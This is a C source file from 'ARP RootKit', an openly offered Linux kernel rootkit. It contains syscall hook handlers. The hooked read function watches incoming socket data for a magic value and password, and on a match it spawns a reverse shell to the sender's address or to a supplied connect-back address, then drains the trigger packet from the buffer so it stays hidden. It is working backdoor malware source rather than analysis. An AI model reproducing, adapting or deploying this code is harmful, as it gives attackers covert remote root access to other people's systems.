/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Here the hook handlers.
 */

#include <linux/kmod.h>
#include "hooks.h"
#include "kernel.h"
#include "arprk-conf.h"
#include "rshell.h"

asmlinkage int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
	int ret = 0;

	//SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
	//ret = SYSCALL64(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
	return ret;
}

asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
    int ret = 0;

    SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
    //ret = SYSCALL32(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
    return ret;
}

asmlinkage int my_read64(int fd, void *buf, size_t len) {
	char *ubuf = NULL;
	int nread = 0, *addr_len = NULL, ret = 0;
	struct rshell_req *req = NULL;
	struct sockaddr_in *addr = NULL;

	ubuf = (void *) SYSCALL64(__NR_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	addr = (struct sockaddr_in *) (ubuf + 2048);
	addr_len = (int *) (ubuf + 2048 + sizeof(struct sockaddr_in));
	if (ubuf != MAP_FAILED) {
		// MSG_KEEP is the key to keep the data in the queue.
		// then we can compare and serve it without doing a lot of work.
		nread = SYSCALL64(__NR_recvfrom, fd, ubuf, 2048, MSG_PEEK, NULL, NULL);
		if (nread == sizeof(struct rshell_req)) {
			req = (struct rshell_req *) ubuf;
			if (f_memcmp(req->magic, RSHELL_MAGIC, sizeof(RSHELL_MAGIC)) == 0 && f_memcmp(req->password, RSHELL_PASSWORD, sizeof(RSHELL_PASSWORD)) == 0) {
				f_printk("GOT RSHELL REQUEST\n");
				// if client didn't specify a connect-back IP, use the one from sys_recvmsg().
				if (!req->reverse.sin_addr.s_addr) {
					*addr_len = sizeof(struct sockaddr_in);
					ret = SYSCALL64(__NR_getpeername, fd, addr, addr_len, 0, 0, 0);
					//f_printk("ret = %d, *addr_len = %d, addr = %ld\n", ret, *addr_len, addr->sin_addr.s_addr);
					if (!ret && *addr_len == sizeof(struct sockaddr_in)) {
						req->reverse.sin_addr.s_addr = addr->sin_addr.s_addr;
						launch_shell(req->reverse);
					}
				} else {
					launch_shell(req->reverse);
				}
				// empty buffer
				nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(struct rshell_req), 0, 0, 0);
				if (nread == sizeof(struct rshell_req)) {
					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
					return my_read64(fd, buf, len);
				}
				SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
			}
		}
		SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
	}

	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
}

asmlinkage int my_read32(int fd, void *buf, size_t len) {
	return 0;
}

int launch_shell(struct sockaddr_in dest) {
	char *envp[] = { NULL }, *argv[] = { RSHELL_PATH, "255.255.255.255", "65535", NULL };
	int ret = 0;
	
	snprintf(argv[1], 16, "%pI4", &dest.sin_addr.s_addr);
	snprintf(argv[2], 6, "%hu", ntohs(dest.sin_port));
	f_printk("addr = %s, port = %s\n", argv[1], argv[2]);
	ret = f_call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	return ret;
}
